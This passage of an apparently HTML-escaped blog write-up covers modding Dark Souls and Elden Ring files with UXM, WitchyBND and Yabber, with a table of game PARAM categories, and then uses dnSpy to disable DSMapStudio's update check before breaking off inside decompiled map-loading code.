involved:\u003C/p>\n\u003Cul>\n\u003Cli>\u003Ccode>regulation.bin\u003C/code>, \u003Ccode>data0.bdt\u003C/code>\u003C/li>\n\u003Cli>Directories: \u003Ccode>chr\u003C/code>, \u003Ccode>parts\u003C/code>, \u003Ccode>map\u003C/code>, \u003Ccode>event\u003C/code>, \u003Ccode>msg\u003C/code>, \u003Ccode>menu\u003C/code>, \u003Ccode>script\u003C/code>, \u003Ccode>param\u003C/code>\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003Cli>\n\u003Cp>These mods replace in-game assets or behavior without directly modifying memory.\u003C/p>\n\u003C/li>\n\u003C/ul>\n\u003Ch2 id=\"approach\">Approach\u003C/h2>\n\u003Col>\n\u003Cli>\n\u003Cp>\u003Cstrong>Explore the dump:\u003C/strong>\u003C/p>\n\u003Cul>\n\u003Cli>Identify file types relevant to the Firekeeper (maps, characters, events).\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>Reverse Havoc Engine formats:\u003C/strong>\u003C/p>\n\u003Cul>\n\u003Cli>Understand how \u003Ccode>.bdt\u003C/code>, \u003Ccode>.param\u003C/code>, \u003Ccode>.event\u003C/code> and other proprietary files are loaded.\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>Use proper tools:\u003C/strong>\u003C/p>\n\u003Cul>\n\u003Cli>\u003Cstrong>WitchyBND\u003C/strong> for extracting and modifying BND archives.\u003C/li>\n\u003Cli>\u003Cstrong>Smithbox\u003C/strong> for map-related analysis.\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>Locate the Firekeeper:\u003C/strong>\u003C/p>\n\u003Cul>\n\u003Cli>Track character spawn data, event scripts, and map files to pinpoint her location.\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003C/ol>\n\u003Ch2 id=\"understanding-file-structure-for-file-replacement-mods\">Understanding file structure for file replacement mods\u003C/h2>\n\u003Cp>This is one of the most critical aspects of using mods, and something that many users get wrong.\u003C/p>\n\u003Cp>Basically, all mod loaders expect the mod files that you add to be in a very specific structure, which mirrors the same structure used internally by the game. \u003C/p>\n\u003Cp>For example, below are screenshots of Clever’s Moveset Modpack being added both correctly and incorrectly to the Mod Engine 2 “mod” folder. This example is applicable to any other mod loader and game, not just ME2 and Elden Ring\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/havok-engine-reverse-engineering/image-1.png\" alt=\"File structure example\">\u003C/p>\n\u003Cp>This is correct and will work, because all these folders and the regulation.bin file are things that the mod loader is looking for, being part of the game’s internal file structure, and they are placed directly in the “mod” folder. In the case of ME3, it would be the equivalent “eldenring-mods” folder by default.\u003C/p>\n\u003Cp>Before starting it it’s important to identify what Game version the files are in ie # How to Identify the Game Version (Patch) a Mod Uses\u003C/p>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u003Ctable>\u003Cthead>\u003Ctr>\u003Cth>\u003Cstrong>Category\u003C/strong>\u003C/th>\u003Cth>\u003Cstrong>Parameter\u003C/strong>\u003C/th>\u003Cth>\u003Cstrong>Description\u003C/strong>\u003C/th>\u003C/tr>\u003C/thead>\u003Ctbody>\u003Ctr>\u003Ctd>\u003Cstrong>Game Parameters\u003C/strong>\u003C/td>\u003Ctd>AIStandardInfoBank\u003C/td>\u003Ctd>Determines the parameters for enemy AI\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>AtkParam\u003C/td>\u003Ctd>Determines hitbox and damage parameters for attacks\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>BehaviorParam\u003C/td>\u003Ctd>Determines behavior parameters for triggering projectiles and attacks\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>Bullet\u003C/td>\u003Ctd>Determines parameters of projectiles\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>CalcCorrectGraph\u003C/td>\u003Ctd>Handles value curve functions for various mechanics\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>CharaInitParam\u003C/td>\u003Ctd>Determines loadout parameters for Armored Core type characters\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>CoolTimeParam\u003C/td>\u003Ctd>Determines cooldowns (abilities, actions, etc.)\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>EnemyBehaviorBank\u003C/td>\u003Ctd>Parameters for enemy behavior and collision\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>EquipMtrlSetParam\u003C/td>\u003Ctd>Material costs for various transactions\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>EquipParamAccessory\u003C/td>\u003Ctd>Parameters for accessories\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>EquipParamGoods\u003C/td>\u003Ctd>Parameters for goods\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>EquipParamProtector\u003C/td>\u003Ctd>Parameters for equipment/armor\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>EquipParamWeapon\u003C/td>\u003Ctd>Defines weapon types and affinities; affects scaling on consumables; special effects can be modified via ReinforceParamWeapon\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>FaceGenParam\u003C/td>\u003Ctd>Configuration of NPC faces\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>GameAreaParam\u003C/td>\u003Ctd>Determines soul and humanity drops upon boss victories\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>HitMtrlParam\u003C/td>\u003Ctd>Parameters applied when hitting various materials\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>ItemLotParam\u003C/td>\u003Ctd>Determines contents of treasures and item rewards\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>KnockBackParam\u003C/td>\u003Ctd>Parameters relating to knockback\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>LevelSyncParam\u003C/td>\u003Ctd>Parameters for level synchronization\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>LockCamParam\u003C/td>\u003Ctd>Parameters for player cameras\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>Magic\u003C/td>\u003Ctd>Configuration of magic spells\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>MenuColorTableParam\u003C/td>\u003Ctd>Coloring used for various interface elements\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>MoveParam\u003C/td>\u003Ctd>Parameters for movement\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>NpcParam\u003C/td>\u003Ctd>Parameters for enemy characters\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>NpcThinkParam\u003C/td>\u003Ctd>Parameters for enemy AI thinking/decision making\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>ObjActParam\u003C/td>\u003Ctd>Parameters for object interactions\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>ObjectParam\u003C/td>\u003Ctd>Parameters for objects\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>QwcChange\u003C/td>\u003Ctd>Parameters for world tendency changes\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>QwcJudge\u003C/td>\u003Ctd>Parameters for world tendency effects\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>RagdollParam\u003C/td>\u003Ctd>Parameters for ragdolls\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>ReinforceParamProtector\u003C/td>\u003Ctd>Parameters for reinforcing armor\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>ReinforceParamWeapon\u003C/td>\u003Ctd>Parameters for reinforcing weapons\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>ShopLineupParam\u003C/td>\u003Ctd>Parameters for shops\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>SkeletonParam\u003C/td>\u003Ctd>Parameters for character skeleton and foot IK\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>SpEffectParam\u003C/td>\u003Ctd>Parameters for special effects\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>SpEffectVfxParam\u003C/td>\u003Ctd>Parameters for particles triggered via SpEffect\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>TalkParam\u003C/td>\u003Ctd>Parameters for character dialogues\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>ThrowParam\u003C/td>\u003Ctd>Parameters for throws\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>WhiteCoolTimeParam\u003C/td>\u003Ctd>Parameters for friendly phantoms cooldowns\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003Cstrong>Graphical Parameters\u003C/strong>\u003C/td>\u003Ctd>DofBank\u003C/td>\u003Ctd>Parameters for depth of field assignments\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>EnvLightTexBank\u003C/td>\u003Ctd>Parameters for environmental lighting textures\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>FogBank\u003C/td>\u003Ctd>Parameters for fog volumes\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>LensFlareBank\u003C/td>\u003Ctd>Parameters for lens flares\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>LensFlareExBank\u003C/td>\u003Ctd>Parameters for lens flares\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>LightBank\u003C/td>\u003Ctd>Parameters for light maps\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>LightScatteringBank\u003C/td>\u003Ctd>Parameters for light scattering\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>LodBank\u003C/td>\u003Ctd>Parameters for levels of detail\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>PointLightBank\u003C/td>\u003Ctd>Parameters for point lights\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>ShadowBank\u003C/td>\u003Ctd>Parameters for shadow maps\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003C/td>\u003Ctd>ToneMapBank\u003C/td>\u003Ctd>Parameters for tone maps\u003C/td>\u003C/tr>\u003C/tbody>\u003C/table>\n\u003Chr>\n\u003Cp>First, start by \u003Cstrong>unpacking the game using UXM\u003C/strong>. UXM allows you to patch the executable so the game can load loose files instead of reading directly from the packed archives. This is crucial because it enables file-level modding without permanently altering the original archives. After downloading UXM from its GitHub repository, select the game you want to mod (DS1, DS2, SotFS, DS3, or Sekiro) and let UXM unpack all game assets into a folder. The tool will also automatically patch the game executable, so it references the unpacked loose files during runtime.\u003C/p>\n\u003Cp>Once the game is unpacked, the next step is to \u003Cstrong>inspect and edit the PARAM files using WitchyBND\u003C/strong>. WitchyBND is specifically designed to handle FromSoftware’s archive formats, allowing you to unpack and repack .bnd and .parambnd files. Open WitchyBND, load the relevant .parambnd files from the unpacked game folder, and explore the various PARAM tables such as AtkParam, MoveParam, EquipParamWeapon, or NpcParam. Each table corresponds to different gameplay mechanics—attacks, movement, weapon properties, enemy behaviors, and so on. You can modify numeric values, affinities, cooldowns, or other parameters directly within the tool.\u003C/p>\n\u003Cp>After making edits, you need to \u003Cstrong>repack the PARAM files\u003C/strong> with WitchyBND so the game can read your modified values. It’s important to always back up the original PARAM files before making changes, in case anything breaks. Start by testing small modifications, such as adjusting one weapon’s stats or a single enemy parameter, to ensure the changes work as intended. Once you verify your edits, you can expand to more comprehensive adjustments, gradually customizing gameplay mechanics according to your design goals.\u003C/p>\n\u003Cp>This workflow—unpacking with UXM, editing with WitchyBND, and repacking for testing creates a clean and manageable process for modding. The table of PARAM descriptions you prepared earlier serves as a quick reference for identifying which parameters to modify and which to leave untouched, helping you avoid unintended side effects while modding complex systems like AI behavior, weapon affinities, or environmental effects.\u003C/p>\n\u003Chr>\n\u003Cp>This method allows you to \u003Cstrong>force object textures to load in any map\u003C/strong> for both PTDE and Remastered editions of Dark Souls. Normally, objects like bonfires or corpses already exist in multiple maps, so this technique isn’t required for them. However, for objects that appear in only one map and usually grab textures from that specific map rather than their own .bnd, this method ensures that they display correctly in other locations. Be aware that this process is a bit tedious and requires careful handling of multiple files.\u003C/p>\n\u003Cp>Before you start, you will need the following tools: \u003Cstrong>Yabber\u003C/strong> (for unpacking/repacking .bnd and .tpf files), a \u003Cstrong>Flver Editor\u003C/strong> (for viewing and editing .flver model files), and the \u003Cstrong>unpacked game files\u003C/strong>. Make sure you have these ready.\u003C/p>\n\u003Cp>Start by locating the \u003Ccode>.objbnd\u003C/code> file of the object you want to modify inside the \u003Ccode>\\obj\\\u003C/code> folder of the unpacked game files. Use Yabber to unpack it, then locate the \u003Ccode>.flver\u003C/code> model file for the object within the unpacked folder. Open this \u003Ccode>.flver\u003C/code> file in the Flver Editor, and in the \u003Cstrong>FLVER Bones window\u003C/strong>, click on “Material.”\u003C/p>\n\u003Cp>Select the material in the first index \u003Ccode>[0]\u003C/code> and click “Edit” to open the material quick editor window. Here, you will usually see \u003Cstrong>three texture paths\u003C/strong> corresponding to the diffuse, specular (\u003Ccode>_s\u003C/code>), and bump map (\u003Ccode>_n\u003C/code>) textures. The paths indicate which map folder the textures are stored in, e.g., \u003Ccode>\\m10\\\u003C/code>, \u003Ccode>\\m11\\\u003C/code>, etc.\u003C/p>\n\u003Cp>Next, navigate to the \\map\\ folder in the unpacked game files and locate the folder corresponding to the map that contains the textures you want. Within this folder, textures are stored inside .tpfbhd archives labeled like mXX_000X.tpfbhd. Unpack all relevant .tpfbhd files, then search for the .tpf files referenced in your material paths (note that these are .tpf, not .tga). Repeat this process for each material index on your model, as some models use multiple materials.\u003C/p>\n\u003Cp>Once all necessary \u003Ccode>.tpf\u003C/code> files are extracted, create a \u003Cstrong>new folder\u003C/strong> to consolidate them. It’s helpful to name this folder after your object for organization. For each additional extracted folder, copy the \u003Ccode>.dds\u003C/code> files into your new \u003Ccode>.tpf\u003C/code> folder. Then, open the \u003Ccode>_yabber-tpf.xml\u003C/code> file from each source folder, copy the segment between \u003Ccode>&#x3C;texture>\u003C/code> and \u003Ccode>&#x3C;/texture>\u003C/code>, and paste it into your new \u003Ccode>.xml\u003C/code> file inside the \u003Ccode>&#x3C;textures>\u003C/code> section, immediately after the last texture entry.\u003C/p>\n\u003Cp>After combining all textures and XML entries, move your new .tpf folder, containing both the .dds files and the updated .xml, into the .objbnd folder alongside the .flver model file. Use Yabber to repack this folder into a .tpf or .tpf.dcx file. For Remastered editions, convert .tpf.dcx back into a plain .tpf using Yabber DCX.\u003C/p>\n\u003Cp>Finally, edit the _yabber-bnd3.xml for the .objbnd and \u003Cstrong>add your new .tpf file\u003C/strong>, making sure its \u003Cstrong>ID is set to 100\u003C/strong>, as this is required for it to work correctly. Repack the .objbnd with Yabber and test it in-game. If done correctly, the object should now load its textures in any map.\u003C/p>\n\u003Ch2 id=\"now-onto-the-main-ds-map-studio\">Now onto the main DS-MAP Studio\u003C/h2>\n\u003Cp>Now we’ll use \u003Cstrong>dnSpy\u003C/strong> to reverse engineer the \u003Cstrong>mod loader\u003C/strong> so we can adapt it for our \u003Cstrong>custom map\u003C/strong>. Since advanced techniques like \u003Cstrong>DLL injection\u003C/strong> into the \u003Cstrong>PTSR Havoc engine\u003C/strong> or creating a \u003Cstrong>modloader.ini\u003C/strong> are beyond the scope of this writeup, we’ll focus on directly \u003Cstrong>modifying the existing map studio executable\u003C/strong> instead.\u003C/p>\n\u003Cp>\u003Cstrong>dnSpy\u003C/strong> is a powerful .NET debugger and decompiler commonly used in reverse engineering CTF challenges to inspect, edit, and recompile compiled .exe files built with C#. It allows us to open the target executable, decompile it into readable C# code, and explore its internal logic—such as how it loads maps or verifies inputs. Using dnSpy, we can identify and edit key functions that control map loading or validation, patch conditions to always succeed, and embed our own custom behavior. Once modified, dnSpy lets us recompile and save the patched binary, effectively turning the original map studio into a \u003Cstrong>customized mod loader\u003C/strong> that supports our own maps without external injection or configuration files.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/havok-engine-reverse-engineering/image-2.png\" alt=\"dnSpy CheckProgramUpdate function\">\u003C/p>\n\u003Cp>The function CheckProgramUpdate() is responsible for checking for new releases of DSMapStudio by querying GitHub. It creates a GitHubClient instance, fetches the latest release from the soulsmods/DSMapStudio repository, extracts the version number from the tag, and compares it against the local version stored in this._version. If the remote version is newer, it sets _programUpdateAvailable to true and stores the release URL, which later triggers an update prompt inside the application. For a customized or offline build, this behavior is unnecessary and can cause unwanted network requests or popups.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/havok-engine-reverse-engineering/image-3.png\" alt=\"Patched CheckProgramUpdate\">\u003C/p>\n\u003Cp>To disable this check, we can patch the method using dnSpy. After opening the executable in dnSpy, navigate to the method under its containing class, right-click it, and select Edit Method (C#). We then replace the entire body of the function with a minimal stub that does nothing. For example:\u003C/p>\n\u003Cp>private void CheckProgramUpdate()\r\n{\r\nreturn;\r\n}\u003C/p>\n\u003Cp>This patch ensures that the method exits immediately without performing any network calls or version comparisons. Alternatively, you can explicitly set the update variables to safe defaults:\u003C/p>\n\u003Cp>Also GameNotUnpackedWarning is a function that checks that is the custom mod , (Dark Souls 1 PTDE unpacking check)\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t\t// Token: 0x0600002F RID: 47 RVA: 0x00003054 File Offset: 0x00001254\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\tpublic AssetDescription \u003C/span>\u003Cspan style=\"color:#B392F0\">GetMapMSB\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(string \u003C/span>\u003Cspan style=\"color:#FFAB70\">mapid\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">bool\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> writemode \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> false\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\tAssetDescription ad \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> new \u003C/span>\u003Cspan style=\"color:#B392F0\">AssetDescription\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\tad.AssetPath \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> null;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (mapid.Length \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 12\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\t\treturn\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ad;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\tstring preferredPath;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\tstring backupPath;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (this.Type \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> GameType.DarkSoulsIISOTFS)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tDefaultInterpolatedStringHandler defaultInterpolatedStringHandler \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> new \u003C/span>\u003Cspan style=\"color:#B392F0\">DefaultInterpolatedStringHandler\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">9\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendLiteral\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"map\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendFormatted\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(mapid);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendLiteral\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendFormatted\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(mapid);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendLiteral\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\".msb\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tpreferredPath \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> defaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">ToStringAndClear\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> new \u003C/span>\u003Cspan style=\"color:#B392F0\">DefaultInterpolatedStringHandler\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">9\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendLiteral\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"map\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendFormatted\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(mapid);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendLiteral\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendFormatted\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(mapid);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendLiteral\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\".msb\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tbackupPath \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> defaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">ToStringAndClear\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\telse\u003C/span>\u003Cspan style=\"color:#F97583\"> if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (this.Type \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> GameType.Bloodborne \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> mapid.\u003C/span>\u003Cspan style=\"color:#B392F0\">StartsWith\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"m29\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan 